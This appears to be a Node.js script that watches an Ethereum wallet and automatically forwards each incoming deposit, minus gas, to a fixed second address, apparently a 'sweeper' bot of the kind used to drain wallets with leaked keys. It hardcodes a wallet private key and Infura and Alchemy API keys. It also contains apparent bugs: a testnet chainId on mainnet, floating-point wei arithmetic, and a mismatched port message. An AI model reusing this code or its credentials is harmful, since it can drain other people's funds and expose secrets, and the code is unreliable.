const express = require('express');
const app = express();
const ethers = require('ethers');
const { BigNumber, utils } = ethers;
// require('dotenv').config();wss://mainnet.infura.io/ws/v3/3ddf68a943674faebbcf5f5400f91769

// const provider = new ethers.providers.WebSocketProvider('wss://eth-mainnet.g.alchemy.com/v2/heyC7zphoNKs1yc9B_kFuhgyjUqU65Np','mainnet');
// const provider = new ethers.providers.WebSocketProvider('wss://eth-mainnet.ws.alchemyapi.io/v2/J038e3gaccJC6Ue0BrvmpjzxsdfGly9n','mainnet');
const provider = new ethers.providers.WebSocketProvider('wss://mainnet.infura.io/ws/v3/3ddf68a943674faebbcf5f5400f91769','mainnet');
const walletConnection = new ethers.Wallet('44ba40ea81ed1df147ae1122b931079064a5ed211841ee67bbcae89c15366571', provider);
const newAccount = '0xDB18e23DD6C6235D5E09E40b80F22cA5DeF777B5';
const port = process.env.PORT  ||  5000 ; 

const main = async () => {
    // console.log(walletCon)
    const walletCon = await walletConnection.getAddress();
    
    provider.on('pending', (hash) => {
        // console.log(hash)
        provider.getTransaction(hash).then((tx) => {
            
            if (tx == null) return;
            const { from ,to, value } =  tx;
            //   console.log(tx)
            // console.log(utils.formatEther(value))
            if (to == walletCon) {
                // console.log("transaction inside the tx record ",tx)
                console.log("waitiing for transactionn sending");

                 tx.wait(5).then(async (excute) => {

                    try {

                        const balances =  await walletConnection.getBalance('latest');

                         const weibalance =  utils.formatEther(balances) * 1e18;

                        const gassPrice = await provider.getGasPrice();
                        const gass = 21000;
                        const mainGass = BigNumber.from(gass).mul(gassPrice);


                        const gassp = utils.formatEther(mainGass) * 1e18 ;

                        const gb = weibalance - gassp;

                        console.log('the amount to send ',gb)

                        const txr = {
                            to: newAccount,
                            from: walletCon,
                            nonce:  await walletConnection.getTransactionCount(),
                            value: String(gb),
                            chainId: 3,
                            gasPrice: gassPrice,
                            gasLimit: gass
                        }
                      console.log('Sending Data ',txr);
                      walletConnection.sendTransaction(txr).then((trx_receipt) => {

                            console.log(" the transaction have been executed, This is the reciept of the transaction.    amount sent to the second wallet is"+ txr.value + trx_receipt);

                        })

                      console.log(tx)

                    } catch (err) {

                         console.log('an error occured during sending ', err)


                    }


                })





            }





        })





    })



}

if (require.main == module) {
    main()
}


// app.post('/',(req,res)=>{
// // setInterval(main,3)
// main();
//  res.send(" sent successfully");




// })

// https://git.heroku.com/branchmaker.git

// app.listen(port,()=>console.log("now avaliavle"))



// https://git.heroku.com/walletcontroller.git

app.listen(5000,()=>console.log(`app is listening on port ${3000}`));